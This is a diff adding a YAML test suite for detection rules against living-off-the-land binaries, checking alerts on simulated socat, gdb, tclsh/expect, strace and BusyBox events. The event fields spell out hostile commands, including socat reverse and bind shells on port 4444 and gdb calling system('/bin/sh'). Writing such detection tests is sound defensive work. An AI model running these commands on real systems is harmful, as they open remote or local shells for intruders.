@@ -1,0 +1,160 @@
+suite: living_off_the_land
+rules_path: ../../rules/living-off-the-land.yaml
+tests:
+  # ── socat reverse shell ────────────────────────────────────────────────────
+  - name: "socat with EXEC:sh fires lolbin_socat_shell"
+    rule_id: lolbin_socat_shell
+    event:
+      type: syscall
+      comm: socat
+      proc_args: "socat TCP:10.0.0.1:4444 EXEC:sh"
+      syscall:
+        nr: 59
+    expect: alert
+    expect_severity: critical
+
+  - name: "socat with EXEC:bash fires lolbin_socat_shell"
+    rule_id: lolbin_socat_shell
+    event:
+      type: syscall
+      comm: socat
+      proc_args: "socat TCP4-LISTEN:4444,fork EXEC:bash"
+      syscall:
+        nr: 59
+    expect: alert
+    expect_severity: critical
+
+  - name: "socat with PTY:EXEC fires lolbin_socat_shell"
+    rule_id: lolbin_socat_shell
+    event:
+      type: syscall
+      comm: socat
+      proc_args: "socat PTY,raw,echo=0 EXEC:bash"
+      syscall:
+        nr: 59
+    expect: alert
+
+  - name: "plain socat TCP connection does not fire shell rule"
+    event:
+      type: syscall
+      comm: socat
+      proc_args: "socat - TCP:10.0.0.1:80"
+      syscall:
+        nr: 59
+    expect: no_alert
+
+  # ── strace execution proxy ─────────────────────────────────────────────────
+  - name: "accessing /usr/bin/strace fires lolbin_strace_exec"
+    rule_id: lolbin_strace_exec
+    event:
+      type: file
+      comm: malware
+      file:
+        filename: "/usr/bin/strace"
+        op: open
+    expect: alert
+    expect_severity: warning
+
+  - name: "accessing /bin/strace fires lolbin_strace_exec"
+    rule_id: lolbin_strace_exec
+    event:
+      type: file
+      comm: implant
+      file:
+        filename: "/bin/strace"
+        op: open
+    expect: alert
+
+  # ── GDB code execution ─────────────────────────────────────────────────────
+  - name: "gdb with --batch --ex call system fires lolbin_gdb_exec"
+    rule_id: lolbin_gdb_exec
+    event:
+      type: syscall
+      comm: gdb
+      proc_args: "gdb --batch --ex 'call system(\"id\")' /bin/ls"
+      syscall:
+        nr: 59
+    expect: alert
+    expect_severity: warning
+
+  - name: "gdb with -ex call system fires lolbin_gdb_exec"
+    rule_id: lolbin_gdb_exec
+    event:
+      type: syscall
+      comm: gdb
+      proc_args: "gdb -ex 'call system(\"/bin/sh\")' /bin/bash"
+      syscall:
+        nr: 59
+    expect: alert
+
+  - name: "plain gdb debugging does not fire gdb rule"
+    event:
+      type: syscall
+      comm: gdb
+      proc_args: "gdb /usr/bin/nginx 1234"
+      syscall:
+        nr: 59
+    expect: no_alert
+
+  # ── Tcl / expect interpreter ──────────────────────────────────────────────
+  - name: "tclsh with exec sh fires lolbin_tclsh_exec"
+    rule_id: lolbin_tclsh_exec
+    event:
+      type: syscall
+      comm: tclsh
+      proc_args: "tclsh -c 'exec sh -c id'"
+      syscall:
+        nr: 59
+    expect: alert
+    expect_severity: warning
+
+  - name: "expect spawning bash fires lolbin_tclsh_exec"
+    rule_id: lolbin_tclsh_exec
+    event:
+      type: syscall
+      comm: expect
+      proc_args: "expect -c 'spawn bash'"
+      syscall:
+        nr: 59
+    expect: alert
+
+  # ── BusyBox shell ──────────────────────────────────────────────────────────
+  - name: "accessing /bin/busybox fires lolbin_busybox_shell"
+    rule_id: lolbin_busybox_shell
+    event:
+      type: file
+      comm: malware
+      file:
+        filename: "/bin/busybox"
+        op: open
+    expect: alert
+    expect_severity: warning
+
+  - name: "accessing /usr/bin/busybox fires lolbin_busybox_shell"
+    rule_id: lolbin_busybox_shell
+    event:
+      type: file
+      comm: implant
+      file:
+        filename: "/usr/bin/busybox"
+        op: open
+    expect: alert
+
+  # ── Negative cases ─────────────────────────────────────────────────────────
+  - name: "normal ls execve does not fire any LOLBin rule"
+    event:
+      type: syscall
+      comm: ls
+      proc_args: "ls -la /tmp"
+      syscall:
+        nr: 59
+    expect: no_alert
+
+  - name: "reading /etc/hosts does not fire any LOLBin rule"
+    event:
+      type: file
+      comm: malware
+      file:
+        filename: "/etc/hosts"
+        op: read
+    expect: no_alert
